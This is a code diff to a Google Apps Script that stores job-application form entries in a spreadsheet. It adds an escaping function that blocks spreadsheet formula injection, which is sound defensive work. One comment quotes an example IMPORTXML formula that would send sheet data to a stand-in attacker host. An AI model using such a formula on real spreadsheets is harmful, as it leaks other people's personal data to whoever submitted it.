@@ -890,6 +890,11 @@ function setupSheet() {
     // CLIP, not WRAP: one application must stay one screen-height row. The full
     // value is still there — click the cell to read it.
     body.setWrap(false)
+    // Deliberately NOT forcing a plain-text ("@") format on the other columns.
+    // `asText` already neutralises formulas with a leading apostrophe, which
+    // Sheets strips while parsing the write. A text-formatted cell skips that
+    // parsing — so doing both would leave the apostrophe visible in every
+    // international phone number. One mechanism, not two fighting.
     if (column.format) body.setNumberFormat(column.format)
     if (column.align) body.setHorizontalAlignment(column.align)
 
@@ -925,6 +930,34 @@ function setupSheet() {
   return "ok — '" + SHEET_NAME + "' ready with " + width + " columns"
 }
 
+/**
+ * Stops the spreadsheet from EXECUTING what a stranger typed into the form.
+ *
+ * Sheets parses a leading `=`, `+`, `-` or `@` as a formula, exactly as if the
+ * value had been typed into the cell. Two consequences, one annoying and one
+ * serious:
+ *
+ *   - "+55 11 90000-0000" is not a valid formula, so the phone number of every
+ *     candidate who writes their country code lands as #ERROR! and is lost.
+ *   - "=IMPORTXML(\"https://attacker.example/?\"&A2, \"//a\")" IS a valid
+ *     formula. It would run the moment someone on the team opens the sheet, and
+ *     ship other people's data straight out to whoever submitted it.
+ *
+ * That second one matters more than it looks: this script is careful never to
+ * read applicant data back out, but a formula sitting in the sheet turns the
+ * SPREADSHEET into the read channel and walks around that guarantee entirely.
+ *
+ * A leading apostrophe is Sheets' own "this is text" marker. It is not part of
+ * the stored value — `getValue()` returns the string without it — so the cell
+ * shows exactly what the candidate typed, inert.
+ *
+ * Dates and numbers are passed through untouched: they are ours, not theirs.
+ */
+function asText(value) {
+  if (typeof value !== "string" || !value) return value
+  return /^[=+\-@\t\r]/.test(value) ? "'" + value : value
+}
+
 function appendRow(payload) {
   // Two people submitting in the same second would otherwise race for the same
   // row. The lock costs nothing at this volume.
@@ -944,7 +977,8 @@ function appendRow(payload) {
     })
 
     var row = headers.map(function (header) {
-      return Object.prototype.hasOwnProperty.call(byHeader, header) ? byHeader[header] : ""
+      var value = Object.prototype.hasOwnProperty.call(byHeader, header) ? byHeader[header] : ""
+      return asText(value)
     })
 
     sheet.appendRow(row)
